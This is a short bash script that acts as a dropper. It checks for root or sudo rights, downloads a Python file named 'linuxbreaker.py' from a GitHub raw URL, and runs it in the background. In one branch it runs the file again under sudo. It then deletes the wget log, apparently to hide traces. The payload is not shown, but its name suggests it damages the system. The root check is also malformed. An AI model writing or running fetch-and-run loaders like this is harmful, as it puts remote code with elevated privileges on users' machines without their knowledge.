#!/bin/bash

if [[ $(id -u -eq 0) ]]; then
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
elif groups | grep "\<sudo\>" &> /dev/null; then
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; sudo python3 linuxbreaker.py
else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
fi
rm wget-log
